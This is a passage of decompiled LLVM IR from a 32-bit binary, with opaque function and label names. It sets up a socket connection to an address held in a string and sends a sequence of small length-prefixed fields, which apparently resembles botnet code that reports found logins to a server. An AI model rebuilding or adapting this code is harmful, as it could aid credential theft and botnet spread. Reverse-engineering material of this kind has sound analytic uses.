  %v0_804eb1c = load i32, i32* @edi, align 4
  %v1_804eb1c = add i32 %v0_804eb1c, 4
  %v2_804eb1c = inttoptr i32 %v1_804eb1c to i32*
  %v3_804eb1c = load i32, i32* %v2_804eb1c, align 4
  store i32 %v3_804eb1c, i32* %eax.global-to-local, align 4
  %v2_804eb1f = add i32 %v0_804eaac, 16
  %v3_804eb1f = inttoptr i32 %v2_804eb1f to i32*
  store i32 %v3_804eb1c, i32* %v3_804eb1f, align 4
  %v1_804eb20 = call i32 @function_804f8e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804eb20, i32* %eax.global-to-local, align 4
  %v0_804eb28 = load i32, i32* @edi, align 4
  %v1_804eb28 = add i32 %v0_804eb28, 4
  %v2_804eb28 = inttoptr i32 %v1_804eb28 to i32*
  store i32 -1, i32* %v2_804eb28, align 4
  %v0_804eb2f = load i32, i32* @edi, align 4
  %v1_804eb2f = add i32 %v0_804eb2f, 284
  %v2_804eb2f = inttoptr i32 %v1_804eb2f to i8*
  store i8 0, i8* %v2_804eb2f, align 1
  %v0_804eb36 = load i32, i32* @edi, align 4
  %v1_804eb36 = add i32 %v0_804eb36, 12
  %v2_804eb36 = inttoptr i32 %v1_804eb36 to i32*
  store i32 0, i32* %v2_804eb36, align 4
  br label %dec_label_pc_804e052

dec_label_pc_804eb42:                             ; preds = %dec_label_pc_804e81d
  %v2_804eb45 = inttoptr i32 %v0_804e835 to i32*
  store i32 26, i32* %v2_804eb45, align 4
  %v0_804eb47 = call i32 @function_804ed70()
  store i32 %v0_804eb47, i32* %eax.global-to-local, align 4
  %v0_804eb4c = load i32, i32* @esp, align 4
  %v1_804eb4c = inttoptr i32 %v0_804eb4c to i32*
  store i32 27, i32* %v1_804eb4c, align 4
  %v0_804eb53 = call i32 @function_804ed70()
  store i32 %v0_804eb53, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0b5.backedge

dec_label_pc_804e0b5.backedge:                    ; preds = %dec_label_pc_804e137, %dec_label_pc_804e688, %dec_label_pc_804e729, %dec_label_pc_804e127, %dec_label_pc_804e4c6, %dec_label_pc_804e488, %dec_label_pc_804e9fd, %dec_label_pc_804e443, %dec_label_pc_804e8cd, %dec_label_pc_804e31e, %dec_label_pc_804e2e0, %dec_label_pc_804e736, %dec_label_pc_804e295, %dec_label_pc_804e984, %dec_label_pc_804e250, %dec_label_pc_804e6d1, %dec_label_pc_804e84b, %dec_label_pc_804e4b1, %dec_label_pc_804e2d2, %dec_label_pc_804e480, %dec_label_pc_804e309, %dec_label_pc_804e28d, %dec_label_pc_804eb42
  %v0_804e0b5 = load i32, i32* @edi, align 4
  %v1_804e0b5 = add i32 %v0_804e0b5, 12
  %v2_804e0b5 = inttoptr i32 %v1_804e0b5 to i32*
  %v3_804e0b5 = load i32, i32* %v2_804e0b5, align 4
  store i32 %v3_804e0b5, i32* %eax.global-to-local, align 4
  %v1_804e0b8 = icmp eq i32 %v3_804e0b5, 0
  br i1 %v1_804e0b8, label %dec_label_pc_804e052, label %dec_label_pc_804e0b5.backedge.dec_label_pc_804e0bc_crit_edge

dec_label_pc_804e0b5.backedge.dec_label_pc_804e0bc_crit_edge: ; preds = %dec_label_pc_804e0b5.backedge
  %v1_804e0bf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e0bc

dec_label_pc_804eb60:                             ; preds = %dec_label_pc_804e92c
  %v1_804eb60 = add i32 %v0_804e943, 1
  %v8_804eb60 = icmp eq i32 %v1_804eb60, 0
  store i32 %v1_804eb60, i32* %eax.global-to-local, align 4
  br i1 %v8_804eb60, label %dec_label_pc_804e950, label %dec_label_pc_804eb67

dec_label_pc_804eb67:                             ; preds = %dec_label_pc_804eb60
  %v0_804eb67 = load i32, i32* @ecx, align 4
  %v1_804eb67 = load i32, i32* @esp, align 4
  %v2_804eb67 = add i32 %v1_804eb67, -4
  %v3_804eb67 = inttoptr i32 %v2_804eb67 to i32*
  store i32 %v0_804eb67, i32* %v3_804eb67, align 4
  %v1_804eb68 = add i32 %v1_804eb67, -8
  %v2_804eb68 = inttoptr i32 %v1_804eb68 to i32*
  store i32 0, i32* %v2_804eb68, align 4
  %v1_804eb6a = add i32 %v1_804eb67, -12
  %v2_804eb6a = inttoptr i32 %v1_804eb6a to i32*
  store i32 1, i32* %v2_804eb6a, align 4
  %v1_804eb6c = add i32 %v1_804eb67, -16
  %v2_804eb6c = inttoptr i32 %v1_804eb6c to i32*
  store i32 2, i32* %v2_804eb6c, align 4
  %v4_804eb6e = call i32 @function_80500a4(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eb6e, i32* @eax, align 4
  %v0_804eb73 = load i32, i32* @esp, align 4
  %sext7 = mul i32 %v4_804eb6e, 16777216
  %v1_804eb76 = sdiv i32 %sext7, 16777216
  store i32 %v1_804eb76, i32* @ebx, align 4
  %tmp310 = icmp eq i32 %sext7, -16777216
  %v2_804dd37 = inttoptr i32 %v0_804eb73 to i32*
  br i1 %tmp310, label %dec_label_pc_804dd34, label %dec_label_pc_804eb81

dec_label_pc_804eb81:                             ; preds = %dec_label_pc_804eb67
  store i32 2, i32* %v2_804dd37, align 4
  %v0_804eb86 = call i32 @function_804edf0()
  store i32 %v0_804eb86, i32* %eax.global-to-local, align 4
  %v0_804eb8b = load i32, i32* @esp, align 4
  %v1_804eb8b = add i32 %v0_804eb8b, 1828
  %v2_804eb8b = inttoptr i32 %v1_804eb8b to i16*
  store i16 2, i16* %v2_804eb8b, align 2
  %v0_804eb95 = load i32, i32* @esp, align 4
  %v1_804eb95 = inttoptr i32 %v0_804eb95 to i32*
  store i32 ptrtoint ([15 x i8]* @global_var_80521a2.26 to i32), i32* %v1_804eb95, align 4
  %v0_804eb9c = call i32 @function_804fe9c()
  store i32 %v0_804eb9c, i32* %eax.global-to-local, align 4
  %v1_804eba1 = load i32, i32* @esp, align 4
  %v2_804eba1 = add i32 %v1_804eba1, 1832
  %v3_804eba1 = inttoptr i32 %v2_804eba1 to i32*
  store i32 %v0_804eb9c, i32* %v3_804eba1, align 4
  %v0_804eba8 = load i32, i32* @esp, align 4
  %v1_804eba8 = inttoptr i32 %v0_804eba8 to i32*
  %v2_804eba8 = load i32, i32* %v1_804eba8, align 4
  store i32 %v2_804eba8, i32* %eax.global-to-local, align 4
  %v3_804eba8 = add i32 %v0_804eba8, 4
  %v1_804eba9 = inttoptr i32 %v3_804eba8 to i32*
  %v2_804eba9 = load i32, i32* %v1_804eba9, align 4
  store i32 %v2_804eba9, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804eba9, align 4
  store i32 2, i32* %v1_804eba8, align 4
  %v0_804ebae = call i32 @function_804ed40()
  %v1_804ebae = inttoptr i32 %v0_804ebae to i16*
  store i32 %v0_804ebae, i32* %eax.global-to-local, align 4
  %v3_804ebb3 = load i16, i16* %v1_804ebae, align 2
  %v4_804ebb3 = zext i16 %v3_804ebb3 to i32
  %v7_804ebb3 = and i32 %v0_804ebae, -65536
  %v8_804ebb3 = or i32 %v4_804ebb3, %v7_804ebb3
  store i32 %v8_804ebb3, i32* %eax.global-to-local, align 4
  %v0_804ebb6 = load i32, i32* @esp, align 4
  %v1_804ebb6 = inttoptr i32 %v0_804ebb6 to i32*
  store i32 2, i32* %v1_804ebb6, align 4
  %v0_804ebbd = load i32, i32* %eax.global-to-local, align 4
  %v1_804ebbd = trunc i32 %v0_804ebbd to i16
  %v2_804ebbd = load i32, i32* @esp, align 4
  %v3_804ebbd = add i32 %v2_804ebbd, 1830
  %v4_804ebbd = inttoptr i32 %v3_804ebbd to i16*
  store i16 %v1_804ebbd, i16* %v4_804ebbd, align 2
  %v0_804ebc5 = call i32 @function_804ed70()
  %v0_804ebca = load i32, i32* @esp, align 4
  %v1_804ebca = add i32 %v0_804ebca, 1828
  store i32 %v1_804ebca, i32* %eax.global-to-local, align 4
  %v1_804ebd4 = add i32 %v0_804ebca, 8
  %v2_804ebd4 = inttoptr i32 %v1_804ebd4 to i32*
  store i32 16, i32* %v2_804ebd4, align 4
  %v0_804ebd6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ebd6 = add i32 %v0_804ebca, 4
  %v3_804ebd6 = inttoptr i32 %v2_804ebd6 to i32*
  store i32 %v0_804ebd6, i32* %v3_804ebd6, align 4
  %v0_804ebd7 = load i32, i32* @ebx, align 4
  %v3_804ebd7 = inttoptr i32 %v0_804ebca to i32*
  store i32 %v0_804ebd7, i32* %v3_804ebd7, align 4
  %v3_804ebd8 = call i32 @function_804feec(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804ebdd = load i32, i32* @esp, align 4
  %v1_804ebe0 = add i32 %v3_804ebd8, 1
  %v8_804ebe0 = icmp eq i32 %v1_804ebe0, 0
  store i32 %v1_804ebe0, i32* %eax.global-to-local, align 4
  %v1_804ebe1 = icmp eq i1 %v8_804ebe0, false
  br i1 %v1_804ebe1, label %dec_label_pc_804ec9c, label %dec_label_pc_804ebea

dec_label_pc_804ebea:                             ; preds = %dec_label_pc_804eb81, %dec_label_pc_804ec9c
  %storemerge4.in = phi i32 [ %v0_804ed38, %dec_label_pc_804ec9c ], [ %v0_804ebdd, %dec_label_pc_804eb81 ]
  %v0_804ebea = load i32, i32* @ebx, align 4
  %v3_804ebea = inttoptr i32 %storemerge4.in to i32*
  store i32 %v0_804ebea, i32* %v3_804ebea, align 4
  %v1_804ebeb = call i32 @function_804f8e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ebeb, i32* @eax, align 4
  %v0_804ebf0 = load i32, i32* @esp, align 4
  %v1_804ebf0 = inttoptr i32 %v0_804ebf0 to i32*
  store i32 0, i32* %v1_804ebf0, align 4
  %v1_804ebf7 = call i32 @function_80513e0(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ebf7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ebfc

dec_label_pc_804ebfc:                             ; preds = %dec_label_pc_804df85, %dec_label_pc_804df65, %dec_label_pc_804ebea
  %v0_804ebfc = load i32, i32* @ebx, align 4
  %v1_804ebfc = add i32 %v0_804ebfc, 284
  %v2_804ebfc = inttoptr i32 %v1_804ebfc to i8*
  store i8 0, i8* %v2_804ebfc, align 1
  %v0_804ec03 = load i32, i32* @ebx, align 4
  %v1_804ec03 = add i32 %v0_804ec03, 12
  %v2_804ec03 = inttoptr i32 %v1_804ec03 to i32*
  store i32 0, i32* %v2_804ec03, align 4
  br label %dec_label_pc_804df23

dec_label_pc_804ec0f:                             ; preds = %dec_label_pc_804e553
  %v1_804ec0f = add i32 %v0_804e0fa, 40
  %v2_804ec0f = inttoptr i32 %v1_804ec0f to i32*
  %v3_804ec0f = load i32, i32* %v2_804ec0f, align 4
  store i32 %v3_804ec0f, i32* %eax.global-to-local, align 4
  %v1_804ec13 = inttoptr i32 %v3_804ec0f to i32*
  store i32 104, i32* %v1_804ec13, align 4
  %v0_804e56f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e56f

dec_label_pc_804ec1e:                             ; preds = %dec_label_pc_804e56f
  store i32 %v0_804ec1e, i32* @eax, align 4
  %v0_804ec20 = call i32 @function_804d580()
  store i32 %v0_804ec20, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e052

dec_label_pc_804ec2a:                             ; preds = %dec_label_pc_804e636
  %v11_804ec2a = icmp eq i8 %v2_804e636, -5
  %v1_804ec2c = icmp eq i1 %v11_804ec2a, false
  br i1 %v1_804ec2c, label %dec_label_pc_804e170, label %dec_label_pc_804ec32

dec_label_pc_804ec32:                             ; preds = %dec_label_pc_804ec2a
  store i8 -3, i8* %v1_804e636, align 1
  br label %dec_label_pc_804e170

dec_label_pc_804ec3a:                             ; preds = %dec_label_pc_804e62c
  %v1_804ec3a = add i32 %v0_804e618, -4
  %v2_804ec3a = inttoptr i32 %v1_804ec3a to i32*
  store i32 16384, i32* %v2_804ec3a, align 4
  %v1_804ec3f = add i32 %v0_804e618, -8
  %v2_804ec3f = inttoptr i32 %v1_804ec3f to i32*
  store i32 3, i32* %v2_804ec3f, align 4
  %v1_804ec41 = add i32 %v0_804e618, 1863
  store i32 %v1_804ec41, i32* %eax.global-to-local, align 4
  %v0_804ec48 = load i32, i32* @ebx, align 4
  %v1_804ec48 = add i32 %v0_804ec48, 3
  store i32 %v1_804ec48, i32* @ebx, align 4
  %v2_804ec4b = add i32 %v0_804e618, -12
  %v3_804ec4b = inttoptr i32 %v2_804ec4b to i32*
  store i32 %v1_804ec41, i32* %v3_804ec4b, align 4
  %v0_804ec4c = load i32, i32* @esi, align 4
  %v1_804ec4c = add i32 %v0_804ec4c, 3
  store i32 %v1_804ec4c, i32* @esi, align 4
  %v0_804ec4f = load i32, i32* @edi, align 4
  %v1_804ec4f = add i32 %v0_804ec4f, 4
  %v2_804ec4f = inttoptr i32 %v1_804ec4f to i32*
  %v3_804ec4f = load i32, i32* %v2_804ec4f, align 4
  store i32 %v3_804ec4f, i32* %eax.global-to-local, align 4
  %v2_804ec52 = add i32 %v0_804e618, -16
  %v3_804ec52 = inttoptr i32 %v2_804ec52 to i32*
  store i32 %v3_804ec4f, i32* %v3_804ec52, align 4
  %v0_804ec53 = call i32 @function_804fff3()
  %v0_804ec58 = load i32, i32* @esp, align 4
  %v1_804ec58 = add i32 %v0_804ec58, -4
  %v2_804ec58 = inttoptr i32 %v1_804ec58 to i32*
  store i32 16384, i32* %v2_804ec58, align 4
  %v1_804ec5d = add i32 %v0_804ec58, -8
  %v2_804ec5d = inttoptr i32 %v1_804ec5d to i32*
  store i32 9, i32* %v2_804ec5d, align 4
  %v1_804ec5f = add i32 %v0_804ec58, 1847
  store i32 %v1_804ec5f, i32* %eax.global-to-local, align 4
  %v2_804ec66 = add i32 %v0_804ec58, -12
  %v3_804ec66 = inttoptr i32 %v2_804ec66 to i32*
  store i32 %v1_804ec5f, i32* %v3_804ec66, align 4
  %v0_804ec67 = load i32, i32* @edi, align 4
  %v1_804ec67 = add i32 %v0_804ec67, 4
  %v2_804ec67 = inttoptr i32 %v1_804ec67 to i32*
  %v3_804ec67 = load i32, i32* %v2_804ec67, align 4
  store i32 %v3_804ec67, i32* %eax.global-to-local, align 4
  %v2_804ec6a = add i32 %v0_804ec58, -16
  %v3_804ec6a = inttoptr i32 %v2_804ec6a to i32*
  store i32 %v3_804ec67, i32* %v3_804ec6a, align 4
  %v0_804ec6b = call i32 @function_804fff3()
  store i32 %v0_804ec6b, i32* %eax.global-to-local, align 4
  %v0_804ec70 = load i32, i32* @esp, align 4
  %v1_804ec70 = add i32 %v0_804ec70, 32
  %v0_804ec73 = load i32, i32* @edi, align 4
  %v1_804ec73 = add i32 %v0_804ec73, 24
  %v2_804ec73 = inttoptr i32 %v1_804ec73 to i32*
  %v3_804ec73 = load i32, i32* %v2_804ec73, align 4
  store i32 %v3_804ec73, i32* %edx.global-to-local, align 4
  %v0_804e140.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e140.backedge

dec_label_pc_804ec8d:                             ; preds = %dec_label_pc_804e3d4
  store i32 %v0_804ec8d, i32* @eax, align 4
  store i32 -1, i32* @esi, align 4
  %v0_804ec92 = call i32 @function_804d580()
  store i32 %v0_804ec92, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804ec9c:                             ; preds = %dec_label_pc_804eb81
  %v1_804ec9c = add i32 %v0_804ebdd, 1864
  %v2_804ec9c = inttoptr i32 %v1_804ec9c to i8*
  store i8 0, i8* %v2_804ec9c, align 1
  %v0_804eca4 = load i32, i32* @esp, align 4
  %v1_804eca4 = add i32 %v0_804eca4, -4
  %v2_804eca4 = inttoptr i32 %v1_804eca4 to i32*
  store i32 16384, i32* %v2_804eca4, align 4
  %v1_804eca9 = add i32 %v0_804eca4, -8
  %v2_804eca9 = inttoptr i32 %v1_804eca9 to i32*
  store i32 1, i32* %v2_804eca9, align 4
  %v1_804ecab = add i32 %v0_804eca4, 1848
  store i32 %v1_804ecab, i32* %edx.global-to-local, align 4
  %v2_804ecb2 = add i32 %v0_804eca4, -12
  %v3_804ecb2 = inttoptr i32 %v2_804ecb2 to i32*
  store i32 %v1_804ecab, i32* %v3_804ecb2, align 4
  %v0_804ecb3 = load i32, i32* @ebx, align 4
  %v2_804ecb3 = add i32 %v0_804eca4, -16
  %v3_804ecb3 = inttoptr i32 %v2_804ecb3 to i32*
  store i32 %v0_804ecb3, i32* %v3_804ecb3, align 4
  %v0_804ecb4 = call i32 @function_804fff3()
  %v0_804ecb9 = load i32, i32* @esp, align 4
  %v1_804ecb9 = add i32 %v0_804ecb9, -4
  %v2_804ecb9 = inttoptr i32 %v1_804ecb9 to i32*
  store i32 16384, i32* %v2_804ecb9, align 4
  %v1_804ecbe = add i32 %v0_804ecb9, -8
  %v2_804ecbe = inttoptr i32 %v1_804ecbe to i32*
  store i32 4, i32* %v2_804ecbe, align 4
  %v1_804ecc0 = add i32 %v0_804ecb9, 1872
  store i32 %v1_804ecc0, i32* %eax.global-to-local, align 4
  %v2_804ecc7 = add i32 %v0_804ecb9, -12
  %v3_804ecc7 = inttoptr i32 %v2_804ecc7 to i32*
  store i32 %v1_804ecc0, i32* %v3_804ecc7, align 4
  %v0_804ecc8 = load i32, i32* @ebx, align 4
  %v2_804ecc8 = add i32 %v0_804ecb9, -16
  %v3_804ecc8 = inttoptr i32 %v2_804ecc8 to i32*
  store i32 %v0_804ecc8, i32* %v3_804ecc8, align 4
  %v0_804ecc9 = call i32 @function_804fff3()
  %v0_804ecce = load i32, i32* @esp, align 4
  %v1_804ecd1 = add i32 %v0_804ecce, 28
  %v2_804ecd1 = inttoptr i32 %v1_804ecd1 to i32*
  store i32 16384, i32* %v2_804ecd1, align 4
  %v1_804ecd6 = add i32 %v0_804ecce, 24
  %v2_804ecd6 = inttoptr i32 %v1_804ecd6 to i32*
  store i32 2, i32* %v2_804ecd6, align 4
  %v1_804ecd8 = add i32 %v0_804ecce, 1898
  store i32 %v1_804ecd8, i32* %eax.global-to-local, align 4
  %v2_804ecdf = add i32 %v0_804ecce, 20
  %v3_804ecdf = inttoptr i32 %v2_804ecdf to i32*
  store i32 %v1_804ecd8, i32* %v3_804ecdf, align 4
  %v0_804ece0 = load i32, i32* @ebx, align 4
  %v2_804ece0 = add i32 %v0_804ecce, 16
  %v3_804ece0 = inttoptr i32 %v2_804ece0 to i32*
  store i32 %v0_804ece0, i32* %v3_804ece0, align 4
  %v0_804ece1 = call i32 @function_804fff3()
  %v0_804ece6 = load i32, i32* @ebp, align 4
  %v1_804ece6 = add i32 %v0_804ece6, 12
  store i32 %v1_804ece6, i32* %eax.global-to-local, align 4
  %v0_804ece9 = load i32, i32* @esp, align 4
  %v1_804ece9 = add i32 %v0_804ece9, -4
  %v2_804ece9 = inttoptr i32 %v1_804ece9 to i32*
  store i32 16384, i32* %v2_804ece9, align 4
  %v1_804ecee = add i32 %v0_804ece9, -8
  %v2_804ecee = inttoptr i32 %v1_804ecee to i32*
  store i32 1, i32* %v2_804ecee, align 4
  %v0_804ecf0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ecf0 = add i32 %v0_804ece9, -12
  %v3_804ecf0 = inttoptr i32 %v2_804ecf0 to i32*
  store i32 %v0_804ecf0, i32* %v3_804ecf0, align 4
  %v0_804ecf1 = load i32, i32* @ebx, align 4
  %v2_804ecf1 = add i32 %v0_804ece9, -16
  %v3_804ecf1 = inttoptr i32 %v2_804ecf1 to i32*
  store i32 %v0_804ecf1, i32* %v3_804ecf1, align 4
  %v0_804ecf2 = call i32 @function_804fff3()
  %v0_804ecf7 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ecfc = add i32 %v0_804ecf7, 28
  %v2_804ecfc = inttoptr i32 %v1_804ecfc to i32*
  store i32 16384, i32* %v2_804ecfc, align 4
  %v0_804ed01 = load i32, i32* @ebp, align 4
  %v1_804ed01 = add i32 %v0_804ed01, 12
  %v2_804ed01 = inttoptr i32 %v1_804ed01 to i8*
  %v3_804ed01 = load i8, i8* %v2_804ed01, align 1
  %v4_804ed01 = zext i8 %v3_804ed01 to i32
  %v5_804ed01 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ed01 = and i32 %v5_804ed01, -256
  %v7_804ed01 = or i32 %v6_804ed01, %v4_804ed01
  store i32 %v7_804ed01, i32* %eax.global-to-local, align 4
  %v2_804ed04 = add i32 %v0_804ecf7, 24
  %v3_804ed04 = inttoptr i32 %v2_804ed04 to i32*
  store i32 %v7_804ed01, i32* %v3_804ed04, align 4
  %v0_804ed05 = load i32, i32* @ebp, align 4
  %v1_804ed05 = inttoptr i32 %v0_804ed05 to i32*
  %v2_804ed05 = load i32, i32* %v1_804ed05, align 4
  store i32 %v2_804ed05, i32* %eax.global-to-local, align 4
  %v2_804ed08 = add i32 %v0_804ecf7, 20
  %v3_804ed08 = inttoptr i32 %v2_804ed08 to i32*
  store i32 %v2_804ed05, i32* %v3_804ed08, align 4
  %v0_804ed09 = load i32, i32* @ebx, align 4
  %v2_804ed09 = add i32 %v0_804ecf7, 16
  %v3_804ed09 = inttoptr i32 %v2_804ed09 to i32*
  store i32 %v0_804ed09, i32* %v3_804ed09, align 4
  %v0_804ed0a = call i32 @function_804fff3()
  %v0_804ed0f = load i32, i32* @ebp, align 4
  %v1_804ed0f = add i32 %v0_804ed0f, 13
  store i32 %v1_804ed0f, i32* %eax.global-to-local, align 4
  %v0_804ed12 = load i32, i32* @esp, align 4
  %v1_804ed12 = add i32 %v0_804ed12, -4
  %v2_804ed12 = inttoptr i32 %v1_804ed12 to i32*
  store i32 16384, i32* %v2_804ed12, align 4
  %v1_804ed17 = add i32 %v0_804ed12, -8
  %v2_804ed17 = inttoptr i32 %v1_804ed17 to i32*
  store i32 1, i32* %v2_804ed17, align 4
  %v0_804ed19 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed19 = add i32 %v0_804ed12, -12
  %v3_804ed19 = inttoptr i32 %v2_804ed19 to i32*
  store i32 %v0_804ed19, i32* %v3_804ed19, align 4
  %v0_804ed1a = load i32, i32* @ebx, align 4
  %v2_804ed1a = add i32 %v0_804ed12, -16
  %v3_804ed1a = inttoptr i32 %v2_804ed1a to i32*
  store i32 %v0_804ed1a, i32* %v3_804ed1a, align 4
  %v0_804ed1b = call i32 @function_804fff3()
  %v0_804ed20 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ed25 = add i32 %v0_804ed20, 28
  %v2_804ed25 = inttoptr i32 %v1_804ed25 to i32*
  store i32 16384, i32* %v2_804ed25, align 4
  %v0_804ed2a = load i32, i32* @ebp, align 4
  %v1_804ed2a = add i32 %v0_804ed2a, 13
  %v2_804ed2a = inttoptr i32 %v1_804ed2a to i8*
  %v3_804ed2a = load i8, i8* %v2_804ed2a, align 1
  %v4_804ed2a = zext i8 %v3_804ed2a to i32
  %v5_804ed2a = load i32, i32* %eax.global-to-local, align 4
  %v6_804ed2a = and i32 %v5_804ed2a, -256
  %v7_804ed2a = or i32 %v6_804ed2a, %v4_804ed2a
  store i32 %v7_804ed2a, i32* %eax.global-to-local, align 4
  %v2_804ed2d = add i32 %v0_804ed20, 24
  %v3_804ed2d = inttoptr i32 %v2_804ed2d to i32*
  store i32 %v7_804ed2a, i32* %v3_804ed2d, align 4
  %v0_804ed2e = load i32, i32* @ebp, align 4
  %v1_804ed2e = add i32 %v0_804ed2e, 4
  %v2_804ed2e = inttoptr i32 %v1_804ed2e to i32*
  %v3_804ed2e = load i32, i32* %v2_804ed2e, align 4
  store i32 %v3_804ed2e, i32* %eax.global-to-local, align 4
  %v2_804ed31 = add i32 %v0_804ed20, 20
  %v3_804ed31 = inttoptr i32 %v2_804ed31 to i32*
  store i32 %v3_804ed2e, i32* %v3_804ed31, align 4
  %v0_804ed32 = load i32, i32* @ebx, align 4
  %v2_804ed32 = add i32 %v0_804ed20, 16
  %v3_804ed32 = inttoptr i32 %v2_804ed32 to i32*
  store i32 %v0_804ed32, i32* %v3_804ed32, align 4
  %v0_804ed33 = call i32 @function_804fff3()
  store i32 %v0_804ed33, i32* %eax.global-to-local, align 4
  %v0_804ed38 = load i32, i32* @esp, align 4
  %v1_804ed38 = inttoptr i32 %v0_804ed38 to i32*
  %v2_804ed38 = load i32, i32* %v1_804ed38, align 4
  store i32 %v2_804ed38, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ebea

; uselistorder directives
  uselistorder i32 %v0_804ed38, { 1, 0 }
  uselistorder i32 %v3_804ec73, { 1, 0 }
  uselistorder i32 %v0_804ec73, { 1, 0 }
  uselistorder i32 %v0_804ec6b, { 1, 0 }
  uselistorder i32 %v0_804ebdd, { 1, 0 }
  uselistorder i32 %v0_804ebae, { 0, 2, 1 }
  uselistorder i32* %v2_804dd37, { 1, 0 }
  uselistorder i32 %v0_804e0b5, { 1, 0 }
  uselistorder i32 %v0_804eaf1, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804eaf0, { 1, 0, 2 }
  uselistorder i16 %v1_804eaf8, { 1, 0 }
  uselistorder i64 %v8_804eadb, { 1, 0 }
  uselistorder i32 %v1_804e9fd, { 1, 2, 0 }
  uselistorder i32 %v1_804e984, { 1, 2, 0 }
  uselistorder i32 %v0_804e943, { 1, 0, 2 }
  uselistorder i32 %v0_804e91b, { 2, 1, 0 }
  uselistorder i32 %v0_804e8f4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804e879.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804e86d, { 1, 0 }
  uselistorder i32 %v0_804e864, { 1, 0 }
  uselistorder i32 %v0_804e7f3, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804e736, { 1, 2, 0 }
  uselistorder i32 %v0_804e6ef.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804e6de, { 1, 0 }
  uselistorder i32 %v0_804e6a3, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_804e622, { 1, 0, 2 }
  uselistorder i32 %v1_804e61f, { 1, 0, 2 }
  uselistorder i32 %v0_804e61c, { 1, 0 }
  uselistorder i32 %v0_804e618, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v0_804ec1e, { 1, 0 }
  uselistorder i32 %v2_804e140, { 1, 0 }
  uselistorder i32 %v0_804e140, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_804e140, { 0, 2, 1 }
  uselistorder i32 %v0_804e1be120, { 1, 0 }
  uselistorder i32 %v9_804e4b8, { 1, 0 }
  uselistorder i32 %v1_804e4b1, { 1, 3, 2, 0 }
  uselistorder i32 %v0_804e4b1, { 1, 0, 2 }
  uselistorder i32 %v3_804e488, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e480, { 2, 1, 0 }
  uselistorder i32 %v9_804e44f, { 1, 0 }
  uselistorder i32 %v0_804e9fd, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e41d, { 1, 2, 0 }
  uselistorder i32 %v1_804e41d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e418, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_804ec8d, { 1, 0 }
  uselistorder i32* %v1_804e8d7, { 2, 0, 1 }
  uselistorder i32 %v0_804e3b2, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v9_804e310, { 1, 0 }
  uselistorder i32 %v1_804e309, { 1, 3, 2, 0 }
  uselistorder i32 %v0_804e309, { 1, 0, 2 }
  uselistorder i32 %v3_804e2e0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e2d2, { 2, 1, 0 }
  uselistorder i32 %v9_804e2a1, { 1, 0 }
  uselistorder i32 %v0_804e736, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e28d, { 2, 1, 0 }
  uselistorder i32 %v9_804e25c, { 1, 0 }
  uselistorder i32 %v0_804e984, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e244, { 2, 1, 0 }
  uselistorder i32 %v9_804e21c, { 1, 0 }
  uselistorder i32 %v0_804e67c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e207, { 2, 1, 0 }
  uselistorder i32 %v9_804e1d6, { 1, 0 }
  uselistorder i32 %v0_804e7ab, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804e1b2, { 1, 0 }
  uselistorder i32 %v0_804e1b2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e1ac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e1ac, { 0, 2, 1 }
  uselistorder i32 %v0_804e1a7, { 1, 0 }
  uselistorder i8* %v2_804e182, { 1, 0, 2 }
  uselistorder i8* %v1_804e170, { 1, 0, 2 }
  uselistorder i32 %v1_804e14d, { 1, 0, 2 }
  uselistorder i32 %v0_804e5b8, { 1, 0, 2 }
  uselistorder i32 %v0_804e542, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804e1be121, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804e14017, { 1, 0 }
  uselistorder i32 %v3_804e127, { 1, 0 }
  uselistorder i32 %v0_804e127, { 1, 15, 2, 13, 3, 12, 4, 14, 5, 11, 6, 10, 7, 9, 0, 8, 16 }
  uselistorder i32 %v1_804e112, { 0, 2, 1 }
  uselistorder i32 %v0_804e10e, { 1, 0 }
  uselistorder i32 %v0_804e0f5, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_804e0eb, { 1, 0 }
  uselistorder i32 %v1_804e0a3, { 1, 0 }
  uselistorder i32 %v2_804e0a0, { 1, 0 }
